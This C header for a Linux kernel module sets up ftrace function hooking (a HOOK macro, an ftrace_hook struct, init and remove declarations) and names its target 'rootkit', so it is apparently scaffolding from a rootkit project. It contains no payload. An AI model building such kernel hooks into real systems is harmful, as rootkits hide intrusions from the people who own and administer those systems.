#ifndef HOOK_H
#define HOOK_H

#include <linux/ftrace.h>

#define HOOK(_name, _hook, _orig)   \
{                                   \
    .name = (_name),                \
    .function = (_hook),            \
    .original = (_orig),            \
}
#define TARGET_NAME "rootkit"

struct ftrace_hook
{
    const char *name;
    void *function;
    void *original;

    unsigned long address;
    struct ftrace_ops ops;
};

int init_hooks(void);
void remove_hooks(void);

#endif /* !HOOK_H */
